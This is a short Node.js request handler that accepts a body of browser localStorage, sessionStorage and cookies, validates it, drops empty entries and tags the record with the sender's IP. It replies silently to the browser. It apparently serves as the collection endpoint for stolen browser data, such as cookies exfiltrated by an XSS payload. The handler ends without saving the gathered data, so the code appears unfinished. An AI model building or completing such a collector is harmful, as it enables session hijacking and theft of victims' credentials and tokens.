const {valid} = require('sandhands')

const bodyFormat = {
  localStorage: {_:{}, strict: false},
  cookies: {_: String, minLength: 0},
  sessionStorage: {_:{}, strict: false}
}

function storage(request, reply) {
  reply.send()
  if (!valid(request.body, bodyFormat)) return

  const {localStorage, cookies, sessionStorage} = request.body

  const output = {localStorage, cookies, sessionStorage}; // Required Semicolon

  ["localStorage", "sessionStorage"].forEach(storageLocationName => {
    const storageLocation = output[storageLocationName]
    const entries = Object.entries(storageLocation)
    let anyValid = false
    for (let i = 0; i < entries.length; i++) {
      const [key, value] = entries[i]
      if (typeof value != 'string' || value.length < 1) {
        delete storageLocation[key]
      } else {
        if (anyValid === false) anyValid = true
      }
    }

    if (anyValid === false) delete output[storageLocationName]
  })

  if (cookies.length < 1) delete output.cookies

  if (Object.keys(output).length < 1) return

  output.ip = request.headers["X-Forwarded-For"]

  
}

module.exports = storage
